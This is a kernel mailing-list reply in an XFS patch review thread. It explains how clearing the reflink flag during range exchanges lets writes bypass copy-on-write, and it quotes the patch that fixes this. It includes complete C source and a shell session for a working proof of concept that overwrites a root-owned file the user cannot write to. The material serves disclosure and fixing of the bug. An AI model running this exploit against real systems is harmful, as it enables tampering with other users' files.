Received: from mail-ej2-f41.google.com (mail-ej2-f41.google.com [74.125.228.169])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B252130569F
	for <linux-kernel@vger.kernel.org>; Fri,  2 Oct 2026 21:09:12 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.169
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790975356; cv=none; b=ENGWgrN0Gr1/JVS0IHA0DUkeiE5pBkYBM448oIi8cG7HQe1MzsVjVxxiMokrD7bgZoxVRewiyPKz41+4SIYZyp6/tb67iYDi6kxcdUU6XAzXJ9mldJTvgV6MG7vulkYyhhpZ3AFFvtZTKiD8uza9/qLJKQf93BfH05msL8gIL98=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790975356; c=relaxed/simple;
	bh=D55dACVuEOIvv1NWrIyMqo3gSm1x49RxBqzOyoAOUkU=;
	h=Content-Type:Mime-Version:Subject:From:In-Reply-To:Date:Cc:
	 Message-Id:References:To; b=PQAr6ugM/f5UBHEczXbb3hktnQ46UasyMAFS1Acc8gMm8zxBXTIpMMYj5STd4Ga24YHqkdkFz/NE8IKMauhiZgSBqSJnRihY6YkP35CgTvMmWx9wZVKQdrUnklgXUGlnqL5lu5XMqz0EsHwdD7tKlUEnNVDqU934oNldxOcaF8M=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=doyensec.com; spf=pass smtp.mailfrom=doyensec.com; dkim=pass (2048-bit key) header.d=doyensec.com header.i=@doyensec.com header.b=EqCw+lMg; arc=none smtp.client-ip=74.125.228.169
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=doyensec.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=doyensec.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=doyensec.com header.i=@doyensec.com header.b="EqCw+lMg"
Received: by mail-ej2-f41.google.com with SMTP id a640c23a62f3a-c2e3f641442so54336766b.0
        for <linux-kernel@vger.kernel.org>; Fri, 02 Oct 2026 14:09:12 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=doyensec.com; s=google; t=1790975351; x=1791580151; darn=vger.kernel.org;
        h=to:references:message-id:content-transfer-encoding:cc:date
         :in-reply-to:from:subject:mime-version:content-type:from:to:cc
         :subject:date:message-id:reply-to:content-type;
        bh=b5ZWZRWz2ft126w2eCOlHx6CdijrOEJN9H/A2I/HVuw=;
        b=EqCw+lMg7KGHCav8uJn5dQkGebUGQxs3jliRkwWpVj5YRhFHdUzqjGDJlDhrBIkUmW
         Mi0c8cAVIHyRDw+MHdJaBvRrfuTGiFb3fuedKNTVzn5rmpmUtX2YIuAoL/5NM7srFRG3
         sEDb8qM+x/Fk6/7QuWa3Iueg3zkE4iriYHKHHXCIuH+MdKSs40EI67ICMBTmAGRVMJdP
         emRjcHYdr0CZik99wJMkCRIkBxarnd2TidTXyX14f3vJoU/U0MnGw0Oo8Y+W5vuzAkOl
         GCcQiVzxXc/6T5ZWmFQeR4FQWS3biXWnjCyxuuHOa3tF4j4ayOu4qR+hKf5n6nAOiE5H
         fphg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790975351; x=1791580151;
        h=to:references:message-id:content-transfer-encoding:cc:date
         :in-reply-to:from:subject:mime-version:content-type:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=b5ZWZRWz2ft126w2eCOlHx6CdijrOEJN9H/A2I/HVuw=;
        b=Y8rh6pqRnfOFslC30d/jAIa5Cfltd3gwmbr6kaPJfW8BC5cYllEdHcA9z7EcJCmxI0
         /xALTTBMcfeSpRjgcetccmv+8Nvf2lDZMY29fsHomOo6bB2iYiKqPsHS1NeteF/oEcJe
         +Pmp/+V8Zw5iii0FwWxkv64iXeohdO/j6PtayUsbejc0U0tO0Y6JVJqmLclY41fuPFr7
         JZP9mK3VtIi8ORIqRiTBJP/wU/xoRDE/aGcmLqeSr7PvOv5rKk61Zr6opkEQtX1QjBg9
         66tXpXEMoDvKs/BlQxFrVF1daHyACDGs48L66cBvM/PNO1WrFS097yVNnVsuvuBmCuhn
         Eu7Q==
X-Forwarded-Encrypted: i=1; AKwUvBwxjXSVNlCNha5avNL4N40vNZQ2qvMoHmTbcIqezZp2XwTvsbS+EFzWi5SOODXL8iQkGbhtwAepfZJlxuc=@vger.kernel.org
X-Gm-Message-State: AFuF++mFuNoq0oHjdNBS8t3ft2xwbPgTTU9SxHNrTCymVt/WYpzCKY1p
	zlVQX2ly5ggJlW3Ve/Bxs5pFWVgiETY9it6i9iMsbVOhm2vsT6K/8Au2ow7IfKLhUOAO0tC3QGq
	2vtm+w6U=
X-Gm-Gg: AYBFou1pgzRaKen+OQ+ucgFOLz+7qEG2lF+saH8YEKiawMfIB/kpkW3ikNrw0ke4skv
	8PFTBSg/6zdIioOtC+2XXn4J8AAW1/1ig28WhZEXdOrIEw0P8F0Bmgj26QQtMIalv8iEw1iL6gq
	unmT5ZMWxFdQDeLWpUN4M5tcvFmOqYVWQdFD+BlmRIf1aIvox2tlxXFKRRPdKFAssxE4d8Wrjpf
	gVFYn3nzacfqLbi0Yq3Z7hfeb0BLOP38r9GPIC9FDv4CPkUH16O5WNzo9o89Kfdhk9jkm18cnkg
	PkxCwqG9FW8VcRwkzJOwyQWAbmxRA9Z0LpdFKvxWg59QbrTlxCVoG5RbSYh7fprTV10J/Q+HSul
	7cTiG3INBxB9vEXdvBGi+eFkL69uPezxlNHt6P/RdZONexwE1vFq4Fh0bAJyZhy5C8gaagnApJj
	GZeeWV2OkdZ4T4SMHMFV8yobmb1y3VLf4IgVOwRCGjNXPMs7zpUORramMGgUqB1eGqFNvlpVKH/
	FtGrpdFaDpXEKk7CjCipZ9PgeVt7vOzyoWxs7IFp5B0MhAHLkfxuqSL2syA6A==
X-Received: by 2002:a17:907:3f87:b0:c2e:856:2a08 with SMTP id a640c23a62f3a-c2e4a9b37a6mr324358266b.1.1790975350521;
        Fri, 02 Oct 2026 14:09:10 -0700 (PDT)
Received: from smtpclient.apple (80.49.145.194.ipv4.supernova.orange.pl. [80.49.145.194])
        by smtp.gmail.com with ESMTPSA id a640c23a62f3a-c2e4cd266f0sm130223766b.30.2026.10.02.14.09.08
        (version=TLS1_2 cipher=ECDHE-ECDSA-AES128-GCM-SHA256 bits=128/128);
        Fri, 02 Oct 2026 14:09:09 -0700 (PDT)
Content-Type: text/plain;
	charset=us-ascii
Precedence: bulk
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
Mime-Version: 1.0 (Mac OS X Mail 16.0 \(3864.700.51.1.1\))
Subject: Re: [PATCH] xfs: stop exchanging reflink flags during mapping
 exchanges
From: Norbert Szetei <norbert@doyensec.com>
In-Reply-To: <20261002162659.GY2705364@frogsfrogsfrogs>
Date: Fri, 2 Oct 2026 23:08:57 +0200
Cc: Carlos Maiolino <cem@kernel.org>,
 linux-xfs@vger.kernel.org,
 linux-kernel@vger.kernel.org
Content-Transfer-Encoding: quoted-printable
Message-Id: <84F5989D-B089-4AA7-84F3-FD8DEE5D84E3@doyensec.com>
References: <1E196589-DEBE-40AC-AFEA-D420DAAB067F@doyensec.com>
 <20261002162659.GY2705364@frogsfrogsfrogs>
To: "Darrick J. Wong" <djwong@kernel.org>
X-Mailer: Apple Mail (2.3864.700.51.1.1)

On Oct 2, 2026, at 18:26, Darrick J. Wong <djwong@kernel.org> wrote:
>=20
> On Fri, Oct 02, 2026 at 03:38:22PM +0200, Norbert Szetei wrote:
>> When an exchange covers the whole of both files,
>> xmi_can_exchange_reflink_flags() moves the reflink inode flag from =
the
>> file that has it to the other one, deciding that from req->blockcount
>> against XFS_B_TO_FSB(mp, i_disk_size) on each inode.
>>=20
>> i_disk_size does not bound an inode's mappings, and
>> XFS_EXCHMAPS_SET_SIZES creates that state by assigning both =
i_disk_size
>> values from the sizes sampled before the operation without unmapping
>> anything above the new size. An exchange over [0, i_disk_size) can
>> therefore pass every test in the function while an inode still owns
>> shared mappings above EOF, and the post-operation cleanup clears its
>=20
> How do you end up with shared mappings above EOF?  You write a /lot/ =
of
> sentences here but weirdly none of it explains how this key assumption
> is violated.

Fair. Here it is with physical block numbers, 4k blocks. peer is the =
file
that gets rewritten and file1 is the one that ends up with the flag=20
cleared.

Start, nothing shared:

	peer size 4096   -> [100]
	file1 size 12288 -> [200] [201] [202]
	donor1 size 4096 -> [300]
	donor2 size 4096 -> [400]

1. FICLONERANGE peer's block into file1's middle slot:

	peer size 4096   -> [100]
	file1 size 12288 -> [200] [100] [202] reflink flag set
                            ^^^^^ both files own block 100

2. XFS_IOC_EXCHANGE_RANGE file1 against donor1, file1_offset 0,=20
file2_offset 8192, length 0, TO_EOF. One block is exchanged, and the =
sizes
are exchanged with it:

	file1 size 4096   -> [200] [100] [300] reflink flag set
                             ^^^^^^^^^^^ still owned, now past the size
	donor1 size 12288 -> [202]

file1 says it is one block long while it still owns three. Nothing was
unmapped. file2_offset is block 2, so this exchange cannot clear a flag.

3. XFS_IOC_EXCHANGE_RANGE file1 against donor2, both offsets 0, length =
4096.
By i_disk_size this is two one-block files exchanging everything, so
xmi_can_exchange_reflink_flags() agrees and the flag is cleared:

	file1 size 4096   -> [400] [100] [300] reflink flag CLEARED
	donor2 size 4096  -> [200]

Block 100 is still shared with peer.

4. pwrite(file1, 4096, 4096), which is file1's second slot, block 100.
xfs_is_cow_inode(file1) is false, so no CoW:

	peer size 4096 -> [100] same block, new contents

Block 100 is the only one that matters here. PoC below, it reads a file=20=

called peer in the current directory. The filesystem needs reflink and=20=

exchange-range, which mkfs.xfs 7.x turns on by default.


> reflink flag anyway. Later writes to those mappings take the =
non-reflink
>> write path and update blocks that should still have been protected by
>> CoW, which shows up as data corruption between reflink-related files =
and
>> as an rmap overlap that xfs_rmap_convert() rejects.
>>=20
>> Commit a23eca88448e ("xfs: fix exchange-range reflink flag clearing
>> issue with INO1_WRITTEN") disabled the flag exchange for
>> XFS_EXCHMAPS_INO1_WRITTEN requests. Fix this variant by not =
exchanging
>> the flags at all, which subsumes that guard. Whether an inode still =
owns
>> shared blocks outside the exchanged range is not recorded in the data
>> fork, so answering it takes a refcount btree lookup, and
>> xfs_exchmaps_init_intent() has no transaction to do that with, cannot
>> report an error, and runs with both ILOCKs dropped in recovery. =
Deciding
>> it correctly means doing that lookup in xfs_exchrange_mappings(), =
which
>> holds both ILOCKs and a transaction and can return an error. The
>> conservative outcome here is that both inodes keep the reflink flag.
>=20
> Or you could cross-reference the refcount btree with any mappings you
> find beyond i_disk_size.

I can do that for v2. It needs a transaction and both ILOCKs. If you=20
would rather take the fix yourself, that is fine too, whatever you =
prefer.

> XFS_EXCHMAPS_CLEAR_INO{1,2}_REFLINK were only ever set by the decision
>> this patch removes, so xfs_exchmaps_clear_reflink() and the code that
>> consumed them are unreachable and go too. An intent logged by an =
older
>> kernel does carry the bits, but xfs_xmi_item_recover_intent() has =
always
>> masked them off with XFS_EXCHMAPS_PARAMS, and the clearing only =
survived
>> recovery because init_intent re-derived the decision. Recovering such =
an
>> intent now completes the exchange and leaves both reflink flags set.
>>=20
>> The flag that xfs_exchmaps_ensure_reflink() copies to the peer inode =
is
>> now permanent until a FALLOC_FL_UNSHARE_RANGE, an xfs_scrub run or a
>> truncate to empty clears it. Until then that inode keeps the paths
>> xfs_is_cow_inode() selects, ILOCK_EXCL for buffered writes and the
>> -ENOTBLK bounce for unaligned direct writes, and
>> xchk_inode_check_reflink_iflag() preens it on every scrub.
>>=20
>> Fixes: 966ceafc7a43 ("xfs: create deferred log items for file mapping =
exchanges")
>> Cc: stable@vger.kernel.org # v6.10
>> Assisted-by: LLM
>=20
> Oh, this was all slop?  Wonderful.
>=20
>> Signed-off-by: Norbert Szetei <norbert@doyensec.com>
>> ---
>> A reproducer is available on request.
>=20
> POC || GTFO.  I'm not going to play 20 questions here.

Here is how I ran xfs_exchrange_poc:

$ rm -f /tmp/xfs-poc.img
$ truncate -s 512M /tmp/xfs-poc.img
$ mkfs.xfs -q /tmp/xfs-poc.img     # xfsprogs 7.x -> reflink=3D1 =
exchange=3D1
$ sudo mkdir -p /mnt/xfs-poc
$ sudo mount -o loop /tmp/xfs-poc.img /mnt/xfs-poc
$ sudo chmod 1777 /mnt/xfs-poc
$ sudo sh -c "head -c 4096 /dev/zero | tr '\0' 'P' > /mnt/xfs-poc/peer"
$ sudo chown root:root /mnt/xfs-poc/peer; sudo chmod 644 =
/mnt/xfs-poc/peer

$ cd /mnt/xfs-poc
$ ls -l peer; shasum peer
-rw-r--r-- 1 root root 4096 Oct 2 21:00 peer
cbe4b704043468fd92eba2e999097a40370c3e3e  peer

$ echo test > peer=20
-bash: peer: Permission denied

$ ~/xfs_exchrange_poc
peer uid 0 mode 0644 size 4096, block size 4096

start                      peer [14]   file1 size 12288  [27] [28] [29]
1 FICLONERANGE             peer [14]   file1 size 12288  [27] [14] [29]
2 EXCHANGE_RANGE TO_EOF    peer [14]   file1 size  4096  [27] [14] [25]
3 EXCHANGE_RANGE           peer [14]   file1 size  4096  [15] [14] [25]
4 pwrite(file1, 4096)      peer [14]   file1 size  8192  [15] [14] [25]

peer first byte P -> X   PEER REWRITTEN

$ ls -l peer; shasum peer
-rw-r--r-- 1 root root 4096 Oct 2 21:00 peer
54822846951979ed8dc8f7acad8b0edf9cec2fcb  peer


and the source code for xfs_exchrange_poc:

// SPDX-License-Identifier: GPL-2.0
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/vfs.h>
#include <linux/fs.h>
#include <linux/fiemap.h>

#ifndef FICLONERANGE
#define FICLONERANGE _IOW(0x94, 13, struct file_clone_range)
#endif

/* fs/xfs/libxfs/xfs_fs.h */
struct xfs_exchange_range {
	__s32		file1_fd;
	__u32		pad;
	__u64		file1_offset;
	__u64		file2_offset;
	__u64		length;
	__u64		flags;
};
#define XFS_IOC_EXCHANGE_RANGE		_IOW('X', 129, struct =
xfs_exchange_range)
#define XFS_EXCHANGE_RANGE_TO_EOF	(1ULL << 0)

static unsigned long blksz;
static int peer, f1;

static unsigned long long phys(int fd, unsigned long long off)
{
	struct { struct fiemap f; struct fiemap_extent e[1]; } q;

	memset(&q, 0, sizeof q);
	q.f.fm_start =3D off;
	q.f.fm_length =3D blksz;
	q.f.fm_extent_count =3D 1;
	if (ioctl(fd, FS_IOC_FIEMAP, &q.f) || q.f.fm_mapped_extents < 1)
		return 0;
	return (q.e[0].fe_physical + (off - q.e[0].fe_logical)) / blksz;
}

static void show(const char *tag)
{
	struct stat st;
	int i;

	fstat(f1, &st);
	printf("%-26s peer [%llu]   file1 size %5lld  [", tag, =
phys(peer, 0),
	       (long long)st.st_size);
	for (i =3D 0; i < 3; i++)
		printf("%llu%s", phys(f1, (unsigned long long)i * =
blksz),
		       i =3D=3D 2 ? "]\n" : "] [");
}

static int mkfile(const char *name, char fill, int blocks)
{
	char *buf;
	int fd;

	unlink(name);
	fd =3D open(name, O_RDWR | O_CREAT | O_EXCL, 0600);
	if (fd < 0)
		return fprintf(stderr, "open %s: %m\n", name), -1;
	buf =3D malloc(blocks * blksz);
	memset(buf, fill, blocks * blksz);
	if (pwrite(fd, buf, blocks * blksz, 0) !=3D (ssize_t)(blocks * =
blksz))
		return fprintf(stderr, "pwrite %s: %m\n", name), -1;
	free(buf);
	fsync(fd);
	return fd;
}

int main(void)
{
	struct xfs_exchange_range xr;
	struct file_clone_range cr;
	char before[65536], after[65536], *buf;
	struct statfs sfs;
	struct stat st;
	int d1, d2;

	if (statfs(".", &sfs))
		return fprintf(stderr, "statfs: %m\n"), 2;
	if (sfs.f_type !=3D 0x58465342)	/* XFS_SUPER_MAGIC */
		return fprintf(stderr,
			"this directory is not on XFS (statfs type =
0x%lx)\n",
			(unsigned long)sfs.f_type), 2;
	blksz =3D sfs.f_bsize;
	if (blksz < 512 || blksz > 65536)
		return fprintf(stderr, "unexpected block size %lu\n", =
blksz), 2;

	peer =3D open("peer", O_RDONLY);
	if (peer < 0)
		return fprintf(stderr, "open peer: %m\n"), 2;
	syncfs(peer);		/* so FIEMAP reports peer's real blocks =
*/
	fstat(peer, &st);
	printf("peer uid %u mode %04o size %lld, block size %lu\n\n",
	       st.st_uid, st.st_mode & 07777, (long long)st.st_size, =
blksz);
	if (pread(peer, before, blksz, 0) !=3D (ssize_t)blksz)
		return fprintf(stderr, "read peer: %m\n"), 2;

	f1 =3D mkfile("file1", 'A', 3);
	d1 =3D mkfile("donor1", 'B', 1);
	d2 =3D mkfile("donor2", 'C', 1);
	if (f1 < 0 || d1 < 0 || d2 < 0)
		return 2;
	show("start");

	/* 1. share peer's block into the middle of file1 */
	cr =3D (struct file_clone_range){ .src_fd =3D peer, .src_offset =
=3D 0,
					.src_length =3D blksz,
					.dest_offset =3D blksz };
	if (ioctl(f1, FICLONERANGE, &cr))
		return fprintf(stderr, "FICLONERANGE: %m\n"), 2;
	show("1 FICLONERANGE");

	/*
	 * 2. exchange file1's last block against the whole of donor1 =
with
	 * TO_EOF.  The sizes are exchanged too, so file1 claims one =
block
	 * while still owning three.  file2_offset is block 2, so this =
exchange
	 * cannot clear a reflink flag.
	 */
	xr =3D (struct xfs_exchange_range){ .file1_fd =3D d1, =
.file1_offset =3D 0,
					  .file2_offset =3D 2 * blksz,
					  .length =3D 0,
					  .flags =3D =
XFS_EXCHANGE_RANGE_TO_EOF };
	if (ioctl(f1, XFS_IOC_EXCHANGE_RANGE, &xr))
		return fprintf(stderr, "EXCHANGE_RANGE TO_EOF: %m\n"), =
2;
	show("2 EXCHANGE_RANGE TO_EOF");

	/*
	 * 3. by i_disk_size this is a whole-file exchange of two =
one-block
	 * files, so the reflink flag is handed to donor2 and cleared =
off
	 * file1, which still shares a block with peer.
	 */
	xr =3D (struct xfs_exchange_range){ .file1_fd =3D d2, =
.file1_offset =3D 0,
					  .file2_offset =3D 0, .length =3D=
 blksz };
	if (ioctl(f1, XFS_IOC_EXCHANGE_RANGE, &xr))
		return fprintf(stderr, "EXCHANGE_RANGE: %m\n"), 2;
	show("3 EXCHANGE_RANGE");

	/* 4. write to the block file1 still shares with peer */
	buf =3D malloc(blksz);
	memset(buf, 'X', blksz);
	if (pwrite(f1, buf, blksz, blksz) !=3D (ssize_t)blksz)
		return fprintf(stderr, "pwrite: %m\n"), 2;
	fsync(f1);
	show("4 pwrite(file1, 4096)");

	posix_fadvise(peer, 0, 0, POSIX_FADV_DONTNEED);
	if (pread(peer, after, blksz, 0) !=3D (ssize_t)blksz)
		return fprintf(stderr, "re-read peer: %m\n"), 2;
	printf("\npeer first byte %c -> %c   %s\n", before[0], after[0],
	       memcmp(before, after, blksz) ? "PEER REWRITTEN" : "peer =
intact");
	return memcmp(before, after, blksz) ? 0 : 1;
}


N.


> --D
>=20
>> fs/xfs/libxfs/xfs_exchmaps.c | 86 =
+++++-------------------------------
>> 1 file changed, 10 insertions(+), 76 deletions(-)
>>=20
>> diff --git a/fs/xfs/libxfs/xfs_exchmaps.c =
b/fs/xfs/libxfs/xfs_exchmaps.c
>> index 6a66b6075e0a..07288f4163b3 100644
>> --- a/fs/xfs/libxfs/xfs_exchmaps.c
>> +++ b/fs/xfs/libxfs/xfs_exchmaps.c
>> @@ -127,9 +127,7 @@ xmi_has_more_exchange_work(const struct =
xfs_exchmaps_intent *xmi)
>> static inline bool
>> xmi_has_postop_work(const struct xfs_exchmaps_intent *xmi)
>> {
>> - return xmi->xmi_flags & (XFS_EXCHMAPS_CLEAR_INO1_REFLINK |
>> -  XFS_EXCHMAPS_CLEAR_INO2_REFLINK |
>> -  __XFS_EXCHMAPS_INO2_SHORTFORM);
>> + return xmi->xmi_flags & __XFS_EXCHMAPS_INO2_SHORTFORM;
>> }
>>=20
>> /* Check all mappings to make sure we can actually exchange them. */
>> @@ -525,18 +523,6 @@ xfs_exchmaps_link_to_sf(
>> return error;
>> }
>>=20
>> -/* Clear the reflink flag after an exchange. */
>> -static inline void
>> -xfs_exchmaps_clear_reflink(
>> - struct xfs_trans *tp,
>> - struct xfs_inode *ip)
>> -{
>> - trace_xfs_reflink_unset_inode_flag(ip);
>> -
>> - ip->i_diflags2 &=3D ~XFS_DIFLAG2_REFLINK;
>> - xfs_trans_log_inode(tp, ip, XFS_ILOG_CORE);
>> -}
>> -
>> /* Finish whatever work might come after an exchange operation. */
>> static int
>> xfs_exchmaps_do_postop_work(
>> @@ -557,16 +543,6 @@ xfs_exchmaps_do_postop_work(
>> return error;
>> }
>>=20
>> - if (xmi->xmi_flags & XFS_EXCHMAPS_CLEAR_INO1_REFLINK) {
>> - xfs_exchmaps_clear_reflink(tp, xmi->xmi_ip1);
>> - xmi->xmi_flags &=3D ~XFS_EXCHMAPS_CLEAR_INO1_REFLINK;
>> - }
>> -
>> - if (xmi->xmi_flags & XFS_EXCHMAPS_CLEAR_INO2_REFLINK) {
>> - xfs_exchmaps_clear_reflink(tp, xmi->xmi_ip2);
>> - xmi->xmi_flags &=3D ~XFS_EXCHMAPS_CLEAR_INO2_REFLINK;
>> - }
>> -
>> return 0;
>> }
>>=20
>> @@ -948,46 +924,21 @@ xfs_exchmaps_intent_destroy_cache(void)
>> }
>>=20
>> /*
>> - * Decide if we will exchange the reflink flags between the two =
files after the
>> - * exchange.  The only time we want to do this is if we're =
exchanging all
>> - * mappings under EOF and the inode reflink flags have different =
states.
>> + * Allocate and initialize a new incore intent item from a request.
>> + *
>> + * Note that this does not decide anything about the two inodes' =
reflink flags.
>> + * Clearing XFS_DIFLAG2_REFLINK off an inode needs to know whether =
it still owns
>> + * shared blocks outside the exchanged range, which is not recorded =
in the data
>> + * fork and takes a refcount btree lookup.  This function has no =
transaction to
>> + * do that with and no way to report a failure, so both flags are =
left as they
>> + * are.  xfs_exchmaps_ensure_reflink() copies the flag to the peer =
inode when the
>> + * exchange runs.
>>  */
>> -static inline bool
>> -xmi_can_exchange_reflink_flags(
>> - const struct xfs_exchmaps_req *req,
>> - unsigned int reflink_state)
>> -{
>> - struct xfs_mount *mp =3D req->ip1->i_mount;
>> -
>> - /*
>> -  * The INO1_WRITTEN optimization can skip exchanging hole and
>> -  * unwritten mappings, which means we cannot guarantee that all
>> -  * shared extents actually moved to the other file.  Clearing the
>> -  * reflink flag of an inode that still holds shared extents breaks
>> -  * the CoW write path, so refuse to exchange the flags in that =
case.
>> -  */
>> - if (req->flags & XFS_EXCHMAPS_INO1_WRITTEN)
>> - return false;
>> -
>> - if (hweight32(reflink_state) !=3D 1)
>> - return false;
>> - if (req->startoff1 !=3D 0 || req->startoff2 !=3D 0)
>> - return false;
>> - if (req->blockcount !=3D XFS_B_TO_FSB(mp, req->ip1->i_disk_size))
>> - return false;
>> - if (req->blockcount !=3D XFS_B_TO_FSB(mp, req->ip2->i_disk_size))
>> - return false;
>> - return true;
>> -}
>> -
>> -
>> -/* Allocate and initialize a new incore intent item from a request. =
*/
>> struct xfs_exchmaps_intent *
>> xfs_exchmaps_init_intent(
>> const struct xfs_exchmaps_req *req)
>> {
>> struct xfs_exchmaps_intent *xmi;
>> - unsigned int rs =3D 0;
>>=20
>> xmi =3D kmem_cache_zalloc(xfs_exchmaps_intent_cache,
>> GFP_NOFS | __GFP_NOFAIL);
>> @@ -1011,23 +962,6 @@ xfs_exchmaps_init_intent(
>> xmi->xmi_isize2 =3D req->ip1->i_disk_size;
>> }
>>=20
>> - /* Record the state of each inode's reflink flag before the op. */
>> - if (xfs_is_reflink_inode(req->ip1))
>> - rs |=3D 1;
>> - if (xfs_is_reflink_inode(req->ip2))
>> - rs |=3D 2;
>> -
>> - /*
>> -  * Figure out if we're clearing the reflink flags (which =
effectively
>> -  * exchanges them) after the operation.
>> -  */
>> - if (xmi_can_exchange_reflink_flags(req, rs)) {
>> - if (rs & 1)
>> - xmi->xmi_flags |=3D XFS_EXCHMAPS_CLEAR_INO1_REFLINK;
>> - if (rs & 2)
>> - xmi->xmi_flags |=3D XFS_EXCHMAPS_CLEAR_INO2_REFLINK;
>> - }
>> -
>> if (S_ISDIR(VFS_I(xmi->xmi_ip2)->i_mode) ||
>>     S_ISLNK(VFS_I(xmi->xmi_ip2)->i_mode))
>> xmi->xmi_flags |=3D __XFS_EXCHMAPS_INO2_SHORTFORM;
>> --=20
>> 2.55.0


